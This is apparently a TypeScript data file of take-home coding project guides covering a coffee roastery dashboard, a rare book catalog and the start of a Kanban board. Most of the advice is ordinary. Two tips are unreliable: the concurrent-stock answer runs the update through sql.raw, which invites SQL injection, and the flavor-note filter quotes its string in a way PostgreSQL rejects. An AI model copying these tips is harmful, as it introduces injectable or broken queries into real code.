      { question: 'How would you add support for multiple AI models?', answer: 'Add a model field to the conversation or message. Create a model selector in the UI (GPT-4o, GPT-3.5, Claude 3.5 Sonnet). In the backend, route to the appropriate API client based on the model name. Abstract the streaming interface so both OpenAI and Anthropic clients implement the same async generator protocol.' },
    ],
    extensionIdeas: [
      { idea: 'Conversation search', difficulty: 'beginner', description: 'Add full-text search across all messages using PostgreSQL\'s ts_vector. Show matching conversations in the sidebar with the matching snippet highlighted. Enables users to find past answers quickly.' },
      { idea: 'Image upload and vision', difficulty: 'intermediate', description: 'Allow users to upload images via drag-and-drop. Store in S3 or local filesystem, send the image URL in the messages array using the vision message format. Display uploaded images inline in the chat history.' },
      { idea: 'Custom system prompts (personas)', difficulty: 'beginner', description: 'Let users set a system prompt per conversation (e.g., "You are a code reviewer"). Add a settings gear icon in the chat header. Prepend the system message to the messages array on every API call.' },
      { idea: 'Branching conversations', difficulty: 'advanced', description: 'Allow users to fork from any message to explore a different direction. Store parent_message_id to create a tree structure. Render branches as tabs or a visual tree. This mirrors how ChatGPT\'s branch feature works internally.' },
    ],
  },
  {
    id: 'coffee-roastery-dashboard',
    title: 'Coffee Roastery Dashboard',
    icon: 'database',
    color: '#92400e',
    difficulty: 'intermediate',
    estimatedTime: '5-6 hours',
    techStack: ['React', 'Next.js', 'TypeScript', 'PostgreSQL', 'Docker', 'Drizzle ORM'],
    questions: 4,
    description: 'Build a full-stack dashboard for managing coffee bean inventory, roast profiles, and orders with CRUD operations, filtering, and data visualization.',
    introduction: 'Create a data management application with a real database. Users can browse coffee beans, filter by origin/roast level, view detailed profiles, and manage inventory. This project tests your full-stack fundamentals: database schema design, API routes, and interactive table UI.\n\nThe Coffee Roastery Dashboard is a domain-rich CRUD application that goes beyond the typical todo app or blog. The coffee domain provides natural complexity: beans have origins, varieties, altitude, processing methods, and flavor note arrays. Roast profiles track temperature curves over time. Orders have a status lifecycle from pending through shipped to delivered. This richness tests your ability to model real-world data accurately.\n\nOn the technical side, this project exercises every layer of the full-stack: PostgreSQL schema design with proper relationships and constraints, type-safe API routes using Drizzle ORM, server-side pagination and filtering via query parameters, interactive data tables with sorting and column-specific filters, and Docker containerization for reproducible setup. These are the exact skills that evaluators test in take-home assignments.\n\nWhat makes this project particularly strong for interviews is the data modeling conversation it enables. You can discuss why TEXT[] arrays are appropriate for flavor notes, when to use composite indexes, how to prevent overselling with atomic SQL updates, and the trade-offs between offset and cursor-based pagination. These are senior-level database topics that demonstrate depth beyond basic CRUD.',
    interviewRelevance: 'Common take-home format: "Build a CRUD app with a real database." Tests schema design, API layer, table component with sorting/filtering, and Docker containerization. Evaluators look for clean data flow, error handling, and code organization. The project demonstrates type-safe database queries with Drizzle ORM, which shows modern backend practices. Server-side pagination with URL-synced state proves you understand professional data table patterns. PostgreSQL-specific features like TEXT[] arrays and CHECK constraints show database depth beyond ORM basics. Docker containerization with named volumes and multi-stage builds demonstrates DevOps awareness. Finally, the seed data and comprehensive error handling (404s, FK violations, validation errors) separate thorough engineers from those who only handle the happy path.',
    learningObjectives: [
      'Design a PostgreSQL schema with relationships (beans, roasts, orders)',
      'Build API routes with Drizzle ORM for type-safe database queries',
      'Create interactive data tables with sorting, filtering, and pagination',
      'Implement Docker Compose setup for app + database',
      'Write Zod validation schemas shared between client-side forms and server-side request parsing',
      'Implement proper HTTP semantics: 201 for creation, 204 for deletion, 409 for conflicts, 422 for validation',
      'Handle PostgreSQL-specific features: TEXT[] arrays, CHECK constraints, foreign key cascades',
      'Build a seed script that populates realistic sample data for development and demo purposes',
      'Create a dashboard page with aggregate statistics using SQL COUNT and GROUP BY queries',
      'Implement a multi-stage Dockerfile that produces a lean production image under 200MB',
    ],
    keyQuestions: [
      { question: 'What should the database schema look like?', answer: 'Three core tables with proper relationships. coffee_beans stores the main entity: id (serial primary key), name (varchar 100, not null), origin (varchar 100, not null with index for filtering), variety, altitude_m (integer), process (varchar 50), flavor_notes (TEXT[] array for multiple tasting notes), roast_level (varchar 20 with CHECK constraint limiting to light, medium, medium-dark, dark), stock_kg (decimal 8,2), price_per_kg, and created_at. roast_profiles tracks roasting sessions: id, bean_id (FK to coffee_beans with CASCADE delete), roast_date, duration_min, first_crack_sec, end_temp_c, and notes. orders manages purchases: id, bean_id (FK without CASCADE to prevent accidental data loss), customer_name, quantity_kg, status (varchar 20 with CHECK constraint for pending, processing, shipped, delivered, cancelled), and created_at with index on status for filtering. Add a composite index on (origin, roast_level) for combined filter queries.' },
      { question: 'How do I build the interactive table?', answer: 'Build a reusable DataTable component that accepts generic column definitions: { key, label, sortable, filterable, filterType, render? }. The component syncs all table state (page, limit, sort column, sort direction, filter values) to URL query parameters via useSearchParams, so the table survives page refreshes and is shareable via URL. Column headers are clickable for sorting, showing an up or down arrow indicator. Below the header row, add a filter row with appropriate inputs per column type: text input for strings, select dropdown for enum columns like roast_level and status, and number range inputs for numeric columns. Pagination controls at the bottom show page X of Y with previous/next buttons. Row click navigates to the detail page. A row actions dropdown provides Edit and Delete options, with Delete requiring a confirmation dialog.' },
      { question: 'What makes a take-home submission stand out?', answer: 'Several things elevate a submission from adequate to impressive. First, seeded data: write a seed script that creates 50+ beans across 10 origins with realistic flavor profiles, multiple roast profiles per bean, and orders in various statuses. Second, comprehensive error handling: return proper HTTP status codes (422 for validation with field-level errors, 404 for missing records, 409 for FK constraint violations like deleting a bean with active orders). Third, loading states (skeleton UI while data fetches), empty states (clear message with action button when no records match filters), and responsive design that works on mobile. Fourth, a clear README with a schema diagram, API reference table, environment setup instructions, and a one-command Docker startup. Fifth, URL-synced table state that survives page refresh and is shareable.' },
      { question: 'How should I structure the Next.js routes?', answer: 'Organize API routes and pages to mirror the domain model. API routes: GET /api/beans (paginated list with query param filters), POST /api/beans (create with Zod validation), GET /api/beans/[id] (detail with joined roast profiles), PUT /api/beans/[id] (update), DELETE /api/beans/[id] (delete with FK check), GET /api/dashboard/stats (aggregate counts and top origins). Pages: /dashboard (stat cards and charts), /beans (data table with all filters), /beans/new (creation form), /beans/[id] (detail page with inline edit toggle and linked roast profiles), /roasts (roast profile table), /orders (order management table with status filter). Use Next.js Server Components for initial data fetching (no HTTP round-trip) and Client Components for interactive features like table sorting and form submission.' },
      { question: 'How do I handle concurrent stock updates safely?', answer: 'The classic overselling problem: two simultaneous orders both read stock = 10, both subtract 8, and both write 2. The actual remaining should be negative, meaning one order should have been rejected. Solve this with atomic SQL: UPDATE coffee_beans SET stock_kg = stock_kg - $qty WHERE id = $id AND stock_kg >= $qty. If the WHERE clause fails (insufficient stock), zero rows are affected and you return 409 Conflict with a message like Insufficient stock. This single atomic statement prevents race conditions without explicit locking. In Drizzle, use the sql template literal: db.execute(sql.raw(atomicUpdateQuery)). This pattern is directly relevant to inventory management interview questions.' },
      { question: 'Why use Drizzle ORM instead of Prisma?', answer: 'Drizzle produces transparent SQL-like query builders where you can predict the exact SQL that will be generated. The select().from().where().orderBy() chain maps directly to SQL clauses, making debugging straightforward. Drizzle infers TypeScript types directly from schema definitions with no separate type generation step or generated client. The migration files are plain SQL that you can inspect and version-control. Drizzle also has a significantly smaller runtime footprint than Prisma, which includes a Rust query engine binary. For a take-home where evaluators will read your code, the SQL-transparent nature of Drizzle makes your data access logic immediately understandable without needing to know the ORM conventions.' },
    ],
    implementationSteps: [
      { phase: 1, title: 'Docker & Database Setup', description: 'Get PostgreSQL running locally in Docker and connect Drizzle ORM so you can run migrations and seed data before writing any UI.', tasks: ['Write docker-compose.yml with postgres:16 service and a named volume for persistence', 'Initialize Next.js 14 with TypeScript, install drizzle-orm, drizzle-kit, and pg', 'Define Drizzle schema in src/db/schema.ts for coffee_beans, roast_profiles, and orders', 'Run drizzle-kit generate then drizzle-kit migrate to create tables', 'Write seed script src/db/seed.ts with 50 realistic coffee beans across 10 origins'] },
      { phase: 2, title: 'API Routes', description: 'Build all REST endpoints using Next.js Route Handlers with Drizzle queries, Zod validation, and proper HTTP semantics.', tasks: ['Implement GET /api/beans with query param parsing for page, limit, sort, order, origin, roast_level', 'Build POST /api/beans with Zod validation and Drizzle insert', 'Add GET, PUT, DELETE /api/beans/[id] with 404 handling for missing records', 'Create GET /api/beans/[id]/roasts for related roast profiles', 'Add GET /api/dashboard/stats for total beans, orders by status, and top origins'] },
      { phase: 3, title: 'Data Table Component', description: 'Build a reusable server-driven DataTable with column sorting, filters, pagination, and row actions.', tasks: ['Create DataTable component accepting column definitions with { key, label, sortable, render? }', 'Implement URL-synced state via useSearchParams for page, sort, order, and all filter values', 'Add column header click to toggle sort direction with an up/down visual indicator', 'Build filter row below headers: text input for strings, select dropdown for enum columns', 'Add a row actions dropdown (View, Edit, Delete) with a confirmation dialog for destructive actions'] },
      { phase: 4, title: 'Detail Pages & Dashboard', description: 'Build bean detail/edit page, the overview dashboard with summary stats, and final Docker production polish.', tasks: ['Create /beans/[id] page with inline read/edit toggle, flavor notes tags, and linked roast profiles', 'Build /beans/new page with a controlled form, client-side Zod validation, and redirect on save', 'Add /dashboard page with stat cards (total beans, pending orders) and a bar chart by origin', 'Write multi-stage Dockerfile for Next.js using standalone output mode for a lean image', 'Final README with ASCII schema diagram, API reference table, and one-command setup instructions'] },
    ],
    fileStructure: `coffee-roastery-dashboard/
├── docker-compose.yml
├── Dockerfile
├── .env.example
├── README.md
├── drizzle.config.ts
├── package.json
└── src/
    ├── app/
    │   ├── layout.tsx
    │   ├── page.tsx
    │   ├── dashboard/page.tsx
    │   ├── beans/
    │   │   ├── page.tsx
    │   │   ├── new/page.tsx
    │   │   └── [id]/page.tsx
    │   ├── roasts/page.tsx
    │   ├── orders/page.tsx
    │   └── api/
    │       ├── beans/
    │       │   ├── route.ts
    │       │   └── [id]/
    │       │       ├── route.ts
    │       │       └── roasts/route.ts
    │       └── dashboard/stats/route.ts
    ├── components/
    │   ├── DataTable.tsx
    │   ├── BeanForm.tsx
    │   ├── StatCard.tsx
    │   ├── FilterBar.tsx
    │   └── ConfirmDialog.tsx
    ├── db/
    │   ├── index.ts
    │   ├── schema.ts
    │   ├── seed.ts
    │   └── migrations/
    └── lib/
        ├── validations.ts
        └── utils.ts`,
    architectureLayers: [
      { name: 'Page Layer', description: 'Next.js App Router server components fetch initial data via direct Drizzle calls with no HTTP round-trip, passing data down to client components for interactivity.' },
      { name: 'API Route Layer', description: 'Next.js Route Handlers at /api/* handle client-triggered mutations and paginated list fetches. All responses are typed using the same Zod schemas used for request validation.' },
      { name: 'Data Access Layer', description: 'Drizzle ORM queries centralized in src/db/ — a type-safe SQL builder with full schema inference. All filter, sort, and pagination logic lives here, not scattered across route handlers.' },
      { name: 'Validation Layer', description: 'Zod schemas in lib/validations.ts define the shapes of API request bodies and query params, shared between client-side form validation and server-side request parsing.' },
      { name: 'Component Layer', description: 'Reusable UI components including DataTable, BeanForm, and StatCard. DataTable accepts generic column definitions and a data array, keeping it fully decoupled from the coffee domain model.' },
      { name: 'Infrastructure Layer', description: 'Docker Compose connects the Next.js app container and PostgreSQL container on a shared bridge network. A named volume ensures data persists across container restarts and removals.' },
    ],
    dataModel: {
      description: 'Three tables: coffee_beans as the central entity, roast_profiles as a one-to-many child (each bean has multiple roast sessions), and orders as independent purchase transactions referencing beans.',
      schema: `CREATE TABLE coffee_beans (
  id            SERIAL PRIMARY KEY,
  name          VARCHAR(100) NOT NULL,
  origin        VARCHAR(100) NOT NULL,
  variety       VARCHAR(100),
  altitude_m    INTEGER,
  process       VARCHAR(50),
  flavor_notes  TEXT[],
  roast_level   VARCHAR(20) NOT NULL
                CHECK (roast_level IN ('light','medium','medium-dark','dark')),
  stock_kg      DECIMAL(8,2) NOT NULL DEFAULT 0,
  price_per_kg  DECIMAL(8,2),
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE roast_profiles (
  id              SERIAL PRIMARY KEY,
  bean_id         INTEGER NOT NULL REFERENCES coffee_beans(id) ON DELETE CASCADE,
  roast_date      DATE NOT NULL,
  duration_min    INTEGER,
  first_crack_sec INTEGER,
  end_temp_c      INTEGER,
  notes           TEXT,
  created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE TABLE orders (
  id            SERIAL PRIMARY KEY,
  bean_id       INTEGER NOT NULL REFERENCES coffee_beans(id),
  customer_name VARCHAR(100) NOT NULL,
  quantity_kg   DECIMAL(8,2) NOT NULL,
  status        VARCHAR(20) NOT NULL DEFAULT 'pending'
                CHECK (status IN ('pending','processing','shipped','delivered','cancelled')),
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_beans_origin      ON coffee_beans(origin);
CREATE INDEX idx_beans_roast_level ON coffee_beans(roast_level);
CREATE INDEX idx_orders_status     ON orders(status);
CREATE INDEX idx_roasts_bean_id    ON roast_profiles(bean_id);`,
    },
    apiDesign: {
      description: 'REST API using Next.js Route Handlers. List endpoints support server-side pagination, sorting, and filtering via query parameters. All mutation endpoints validate with Zod before touching the database.',
      endpoints: [
        { method: 'GET', path: '/api/beans?page=1&limit=20&sort=name&order=asc&origin=Ethiopia', response: '{ data: CoffeeBean[], total: number, page: number, totalPages: number }' },
        { method: 'POST', path: '/api/beans', response: 'Created CoffeeBean — 201 status, or 422 with Zod field-level errors' },
        { method: 'GET', path: '/api/beans/:id', response: 'CoffeeBean with roast_profiles array joined — 404 if not found' },
        { method: 'PUT', path: '/api/beans/:id', response: 'Updated CoffeeBean — 404 for missing record, 422 for validation errors' },
        { method: 'DELETE', path: '/api/beans/:id', response: '204 No Content — cascades to roast_profiles; 409 if active orders exist' },
        { method: 'GET', path: '/api/dashboard/stats', response: '{ totalBeans, totalStock, ordersByStatus: Record<string,number>, topOrigins: {origin,count}[] }' },
      ],
    },
    codeExamples: {
      typescript: `// db/schema.ts — Drizzle schema with full type inference
import { pgTable, serial, varchar, integer, decimal, text, timestamp } from 'drizzle-orm/pg-core';

export const coffeeBeans = pgTable('coffee_beans', {
  id:          serial('id').primaryKey(),
  name:        varchar('name', { length: 100 }).notNull(),
  origin:      varchar('origin', { length: 100 }).notNull(),
  variety:     varchar('variety', { length: 100 }),
  altitudeM:   integer('altitude_m'),
  process:     varchar('process', { length: 50 }),
  flavorNotes: text('flavor_notes').array(),
  roastLevel:  varchar('roast_level', { length: 20 }).notNull(),
  stockKg:     decimal('stock_kg', { precision: 8, scale: 2 }).notNull().default('0'),
  pricePerKg:  decimal('price_per_kg', { precision: 8, scale: 2 }),
  createdAt:   timestamp('created_at').notNull().defaultNow(),
});

// app/api/beans/route.ts — paginated, filtered list endpoint
import { db } from '@/db';
import { coffeeBeans } from '@/db/schema';
import { eq, count, asc, desc } from 'drizzle-orm';
import { NextRequest, NextResponse } from 'next/server';

export async function GET(req: NextRequest) {
  const sp     = req.nextUrl.searchParams;
  const page   = Math.max(1, Number(sp.get('page') ?? 1));
  const limit  = Math.min(100, Number(sp.get('limit') ?? 20));
  const origin = sp.get('origin');
  const order  = sp.get('order') === 'desc' ? desc : asc;
  const where  = origin ? eq(coffeeBeans.origin, origin) : undefined;

  const [rows, [{ value: total }]] = await Promise.all([
    db.select({ id: coffeeBeans.id, name: coffeeBeans.name,
                origin: coffeeBeans.origin, roastLevel: coffeeBeans.roastLevel,
                stockKg: coffeeBeans.stockKg })
      .from(coffeeBeans).where(where)
      .orderBy(order(coffeeBeans.name))
      .limit(limit).offset((page - 1) * limit),
    db.select({ value: count() }).from(coffeeBeans).where(where),
  ]);

  return NextResponse.json({ data: rows, total: Number(total), page,
    totalPages: Math.ceil(Number(total) / limit) });
}`,
    },
    tradeoffDecisions: [
      { choice: 'Drizzle ORM vs Prisma', picked: 'Drizzle ORM', reason: "The spec calls for Drizzle. It produces transparent SQL-like query builders — you can predict the exact SQL generated. Prisma's generated client is more opaque with a heavier runtime footprint." },
      { choice: 'Server-side vs client-side filtering', picked: 'Server-side filtering', reason: 'Database-level filtering with indexes scales to any dataset size and demonstrates the SQL skills evaluators are testing. Client-side filtering breaks at scale and misses the point of the project.' },
      { choice: 'Next.js Route Handlers vs separate Express backend', picked: 'Next.js Route Handlers', reason: 'Single deployable unit in Docker simplifies evaluator setup. No CORS config needed. Route Handlers share the same TypeScript types as the UI, enabling end-to-end type safety.' },
      { choice: 'URL query state vs React useState for filters', picked: 'URL state via useSearchParams', reason: 'URL-synced filters survive page refreshes, are shareable, and support browser back/forward navigation — a professional pattern that evaluators notice.' },
    ],
    deepDiveTopics: [
      { topic: 'Drizzle ORM type inference', detail: 'Drizzle infers TypeScript types directly from schema definitions — no separate type file to maintain. The select() return type exactly reflects queried columns, and joins produce correctly merged types. drizzle-kit generates inspectable SQL migration files you can version-control, giving full visibility into every schema change.' },
      { topic: 'PostgreSQL TEXT[] array columns', detail: 'Native array columns map cleanly to JavaScript string arrays. For filtering by flavor note, use the @> (contains) operator: WHERE flavor_notes @> ARRAY["blueberry"]. A GIN index on the column makes this O(log n) at scale. Drizzle\'s .array() modifier handles serialization and deserialization automatically.' },
      { topic: 'Docker multi-stage builds for Next.js', detail: 'Naively copying node_modules produces a 1GB+ image. Next.js standalone output mode (output: "standalone" in next.config.js) bundles only runtime-required files. Multi-stage Dockerfile: stage 1 installs deps and builds, stage 2 copies only .next/standalone into clean node:20-alpine. Final image: ~200MB.' },
      { topic: 'Offset vs cursor-based pagination', detail: 'LIMIT/OFFSET pagination scans and discards all preceding rows: page 500 of 10,000 rows reads 9,980 rows to return 20. Cursor pagination (WHERE id > $lastId LIMIT 20) uses an index seek, constant-time regardless of page. For a take-home, offset is fine — mentioning cursor pagination signals senior-level DB awareness.' },
    ],
    commonPitfalls: [
      { pitfall: 'N+1 queries in list views', why: 'Fetching all orders then running a per-row bean-name query produces 51 queries for 50 rows. The table feels slow and the network tab reveals the problem.', solution: 'Use a single Drizzle join: .from(orders).leftJoin(coffeeBeans, eq(orders.beanId, coffeeBeans.id)) to get all data in one query.' },
      { pitfall: 'Data loss on docker-compose down', why: 'Without a named volume the postgres container stores data in an ephemeral writable layer destroyed on container removal.', solution: 'Declare a named volume in docker-compose.yml (postgres_data:) and mount it at /var/lib/postgresql/data in the service definition.' },
      { pitfall: 'Connection pool exhaustion in dev', why: 'Next.js hot reload re-executes module-level code, creating a new Drizzle connection pool each time without closing the old one. PostgreSQL hits its default 100-connection limit quickly.', solution: 'Use a dev singleton pattern: if (!global.__db) { global.__db = drizzle(pool); } export const db = global.__db;' },
      { pitfall: 'Over-fetching in list endpoints', why: 'Selecting all columns including large TEXT[] arrays for every row in the table view wastes bandwidth and slows rendering.', solution: 'Partial select for list endpoints — only id, name, origin, roastLevel, stockKg. Fetch the full record including flavorNotes only on the detail page.' },
    ],
    edgeCases: [
      { scenario: 'Deleting a bean with existing orders', impact: 'FK constraint violation — DELETE fails with a cryptic 500 error if orders references coffee_beans without a CASCADE or soft-delete mechanism.', mitigation: 'Catch pg error code 23503 (foreign key violation) and return 409 Conflict: "Cannot delete bean with active orders. Cancel all orders first."' },
      { scenario: 'Concurrent stock decrements', impact: 'Two simultaneous orders both read stock = 10, both subtract 8, both write 2. Actual remaining stock should be -6 — this is classic overselling.', mitigation: 'Atomic SQL: UPDATE coffee_beans SET stock_kg = stock_kg - $qty WHERE id = $id AND stock_kg >= $qty. If rowsAffected === 0, return 409 Insufficient stock.' },
      { scenario: 'Unvalidated sort parameter', impact: 'Interpolating a sort query param directly into SQL enables ORDER BY injection attacks.', mitigation: 'Validate the sort value against a hardcoded column whitelist. Default to "name" for unrecognized values. Use Drizzle column references rather than string interpolation.' },
      { scenario: 'App starts before migrations run', impact: 'API calls fail with "relation does not exist" on a fresh clone or CI run where tables have not been created.', mitigation: 'In the Docker entrypoint script, run npm run db:migrate before starting Next.js. Log a clear diagnostic message if the migration fails.' },
    ],
    interviewFollowups: [
      { question: 'How would you add authentication and per-user data isolation?', answer: 'Add a users table and associate all records with a user_id. Use NextAuth.js for Google OAuth or credentials auth. Add where(eq(table.userId, session.user.id)) to all Drizzle queries. Protect mutation routes with a session check middleware.' },
      { question: 'How would you push real-time stock changes to all open tabs?', answer: 'Use PostgreSQL LISTEN/NOTIFY triggered on stock updates. The Next.js server holds a persistent pg client that forwards events to browsers via SSE. Each browser tab updates table rows in-place through React state without a full-page reload.' },
      { question: 'How would you add CSV export?', answer: 'GET /api/beans/export queries without a pagination limit, serializes rows with fast-csv, and streams the response with Content-Type: text/csv and Content-Disposition: attachment; filename=beans.csv. The frontend triggers download via a plain anchor tag.' },
      { question: 'How would you scale to 1 million records?', answer: 'Existing indexes handle millions of rows well. Additional: composite index on (origin, roast_level) for combined filters, materialized view for dashboard stats refreshed every 5 minutes, cursor-based pagination to eliminate OFFSET scans, and a read replica for analytics workloads.' },
    ],
    extensionIdeas: [
      { idea: 'CSV import for bulk bean upload', difficulty: 'beginner', description: 'File input accepting CSV, parsed client-side with PapaParse, row preview before submission, then POST to /api/beans/import using Drizzle bulk insert. Demonstrates file handling and batch data pipeline skills.' },
      { idea: 'Roast temperature curve chart', difficulty: 'intermediate', description: 'Add temperature_readings JSONB column to roast_profiles storing [{time_sec, temp_c}] data points. Render an interactive line chart with Recharts on the detail page for visual profile comparison across roasts.' },
      { idea: 'Low stock alerts on dashboard', difficulty: 'beginner', description: 'Add low_stock_threshold column to coffee_beans. Dashboard highlights beans below threshold with a warning badge. A /api/beans/low-stock endpoint drives the alert panel.' },
      { idea: 'Full-text search with PostgreSQL tsvector', difficulty: 'intermediate', description: 'Add a generated tsvector column indexing name, origin, and flavor_notes. Use to_tsquery in the list endpoint. Enables "blueberry Ethiopia" queries across all text fields — much faster than ILIKE at scale.' },
    ],
  },
  {
    id: 'rare-book-library',
    title: 'Rare Book Library',
    icon: 'book',
    color: '#b45309',
    difficulty: 'beginner',
    estimatedTime: '3-4 hours',
    techStack: ['React', 'Vite', 'Tailwind CSS', 'JavaScript', 'Fuse.js', 'Framer Motion'],
    questions: 6,
    description: 'Build a frontend book catalog with advanced filtering, search, sorting, detail views, and wishlist management — the classic frontend take-home.',
    introduction: 'Create a responsive book browsing application using a provided JSON dataset. Implement search across title/author, multi-criteria filtering (genre, year range, availability), sorting options, and a persistent wishlist. This is the most commonly assigned frontend take-home project.\n\nThe rare book library catalog is the archetypal frontend take-home assignment. Companies like Stripe, Notion, Linear, and Vercel use variations of this exact format: here is a dataset, build a browsable UI with search, filters, and some form of user interaction. The project scope is deliberately constrained to 3-4 hours so evaluators can assess your component architecture, state management decisions, and attention to UX detail within a realistic time limit.\n\nWhat makes this project deceptively challenging is the number of small details that separate a junior submission from a senior one: debounced search that does not flicker, URL-synced filter state that survives page refresh, smooth layout transitions between grid and list views, accessible form controls with proper ARIA attributes, loading skeletons instead of blank screens, and a clear empty state when no books match the current filters.\n\nMastering this format is high-ROI because the exact same patterns (filter state management, debounced search, responsive layouts, localStorage persistence) appear in virtually every data-browsing interface you will build in production.',
    interviewRelevance: 'The standard frontend take-home format. Evaluators check: component architecture, state management for filters, search debouncing, responsive grid/list layouts, accessibility, and clean code. This exact format appears at companies like Stripe, Notion, and Linear. Debounced search implementation is a classic interview question you can answer with working code. URL-synced filter state demonstrates professional frontend patterns. The wishlist feature tests localStorage persistence and state management. Responsive grid/list toggle shows CSS Grid mastery. Accessibility (ARIA attributes, keyboard navigation, focus management) distinguishes senior candidates. The project also opens discussions about performance optimization for large datasets, fuzzy search algorithms, and component composition patterns.',
    learningObjectives: [
      'Build a filter system with multiple criteria (genre, year range, availability, rating)',
      'Implement debounced search across multiple text fields (title, author, ISBN)',
      'Create responsive grid/list toggle layout with smooth transitions',
      'Add wishlist with localStorage persistence and undo-remove functionality',
      'Sync all filter state to URL query parameters for shareable and refreshable views',
      'Build skeleton loading states and meaningful empty states with clear-filter actions',
      'Implement accessible form controls with proper ARIA attributes and keyboard navigation',
      'Add fuzzy search with Fuse.js for approximate matching on typos and partial queries',
      'Create a book detail modal or page with full metadata display and related book suggestions',
      'Handle edge cases: empty dataset, single result, special characters in search, and rapid filter changes',
    ],
    keyQuestions: [
      { question: 'How should I structure the filter state?', answer: 'Use a single filters object: { search: string, genres: string[], yearRange: [min, max], availability: boolean | null, rating: number | null, sortBy: string, sortOrder: "asc" | "desc" }. Apply all filters in a single useMemo chain for efficient recomputation. The filter chain should work as a pipeline: start with all books, apply search text match, then genre filter, then year range, then availability, then rating threshold, and finally sort. Each filter step returns a subset of the previous step. Wrapping this in useMemo with the filters object and books array as dependencies ensures it only recomputes when inputs actually change. Sync the filters object to URL query parameters via useSearchParams so the filtered view is shareable and survives page refresh.' },
      { question: 'How do I implement performant search?', answer: 'Debounce the search input by 300ms using a useRef-based timeout pattern: on each keystroke, clear the previous timeout and set a new one. Only update the filter state after 300ms of no typing. This avoids re-filtering and re-rendering the entire book grid on every keystroke. The filter function should match the search text against title, author, and ISBN simultaneously using case-insensitive includes() checks. For datasets larger than 1,000 books or when users expect fuzzy matching (finding "gatsby" when they type "gatzby"), integrate Fuse.js, which uses a modified Bitap algorithm for approximate string matching. Fuse returns results ranked by relevance score, which can replace your manual sort order when a search query is active.' },
      { question: 'What UI details do evaluators notice?', answer: 'Several details signal senior-level craft. Loading states: show skeleton cards with animated shimmer effects while data loads, never a blank screen or a spinner on an otherwise empty page. Empty states: when no books match the current filters, show a clear message like "No books match your filters" with a prominent "Clear all filters" button, not just a blank grid. URL-synced filters: every filter change updates the URL query params (?genre=fiction&sort=year&q=gatsby) so the view is shareable and works with browser back/forward. Keyboard navigation: users can tab through filter controls, press Enter to apply, and Escape to close dropdowns. Smooth transitions: grid/list mode switch should animate rather than jump. Focus management: when opening a book detail view, move focus to the detail container for screen reader users. These details collectively take an hour to implement but dramatically elevate the submission.' },
      { question: 'How do I make the grid/list toggle work well?', answer: 'Use CSS Grid with a state variable controlling the layout mode. In grid mode, set grid-template-columns to repeat(auto-fill, minmax(280px, 1fr)) for a responsive multi-column layout that adapts to screen width. In list mode, set grid-template-columns to 1fr for a single-column layout where each card spans the full width with a horizontal layout (image on the left, text on the right). Add a layout transition using Framer Motion layoutId on each card, which animates the position and size change smoothly. Without animation, toggling between grid and list mode causes a jarring jump that feels cheap. With animation, the transition feels polished and intentional. On mobile screens below 640px, default to a single-column layout regardless of the toggle state.' },
      { question: 'How do I implement the wishlist feature?', answer: 'Store the wishlist as an array of book IDs in localStorage via a custom useWishlist hook. The hook provides: isInWishlist(bookId), addToWishlist(bookId), removeFromWishlist(bookId), and the full wishlist array. On add/remove, immediately update React state for responsive UI, then persist to localStorage asynchronously. Add an undo-remove feature using a toast notification: when a user removes a book, show a toast with "Book removed from wishlist" and an "Undo" button. Store the removed book ID temporarily; if the user clicks Undo within 5 seconds, re-add it. Display a heart icon on each book card that toggles filled/outline based on wishlist status. Add a "View Wishlist" filter toggle that shows only wishlisted books within the current filter context.' },
      { question: 'How do I handle the book detail view?', answer: 'Two approaches work well. A modal overlay shows the full book details without navigating away from the catalog, preserving the user scroll position and filter state. Implement with a fixed-position overlay, focus trap inside the modal, Escape key to close, and click-outside-to-close. Alternatively, a dedicated detail page (/books/:id) works better for deep linking and SEO. Use React Router with a nested route. Display the full metadata: cover image (larger), title, author, ISBN, year, genre, description, availability status, and rating with stars. Add a "Related Books" section showing 3-4 books in the same genre. Include back navigation that preserves the previous filter state via URL params. The modal approach is generally preferred for take-homes because it keeps the user in context and avoids managing route-level state.' },
    ],
  },
  {
    id: 'kanban-board',
    title: 'Kanban Board',
    icon: 'columns',
    color: '#0ea5e9',
    difficulty: 'intermediate',
    estimatedTime: '5-7 hours',
    techStack: ['React', 'TypeScript', 'DnD Kit', 'Tailwind CSS', 'Zustand', 'Framer Motion'],
    questions: 6,
    description: 'Build a Trello-style Kanban board with drag-and-drop cards between columns, task editing, labels, due dates, and board persistence.',
    introduction: 'Create a project management board where users organize tasks across customizable columns (To Do, In Progress, Review, Done). Implement drag-and-drop for reordering cards within columns and moving them between columns. Add task details: description, labels, due dates, and checklists.\n\nThe Kanban board is one of the most complex frontend take-home projects because it combines drag-and-drop interaction, nested sortable lists, cross-container movement, and optimistic state updates. Unlike a simple list or grid, the Kanban board requires reasoning about two-dimensional ordering: cards have positions within columns, and columns themselves can be reordered.\n\nThe drag-and-drop implementation alone covers multiple layers: detecting the drag source and drop target, computing the new position with fractional ordering, handling cross-column moves where a card must be removed from one list and inserted into another atomically, and rendering a drag overlay that follows the cursor. Getting this right with smooth animations and keyboard accessibility is what separates a senior implementation from a basic one.\n\nFor interviews, this project demonstrates advanced state management, complex interaction patterns, and architectural decisions that product companies specifically test for. Companies like Trello, Asana, Linear, and Notion ask variations of "build a Kanban board" as their primary frontend take-home assignment.',
    interviewRelevance: 'Tests complex state management, drag-and-drop implementation, optimistic UI updates, and component architecture. This is a popular take-home for frontend roles at product companies because it exercises real-world interaction patterns. The drag-and-drop implementation demonstrates understanding of pointer events, collision detection, and accessible interaction alternatives. Optimistic reordering shows you can build responsive UIs that do not wait for server acknowledgment. The normalized state shape with float-based ordering demonstrates database-aware frontend architecture. Column WIP limits and card detail modals show product thinking beyond pure engineering. This project opens rich interview discussions about real-time collaboration, conflict resolution for concurrent moves, and performance optimization for boards with hundreds of cards.',
    learningObjectives: [
      'Implement drag-and-drop using @dnd-kit/core with sortable columns and cards',
      'Build an optimistic reorder system that updates UI immediately, syncs to storage async',
      'Create a task detail modal with rich editing (description, labels, due dates, checklists)',
      'Add column management: create, rename, delete, and reorder columns',
      'Design a normalized state shape with float-based ordering for efficient insert and reorder operations',
      'Handle cross-column card moves that atomically remove from source and insert into target',
      'Implement keyboard accessibility: tab through cards, arrow keys to move between columns, Enter to open details',
      'Build a drag overlay that follows the cursor with a smooth scaled-down card preview',
      'Add undo/redo functionality using a state history stack with Cmd+Z and Cmd+Shift+Z shortcuts',
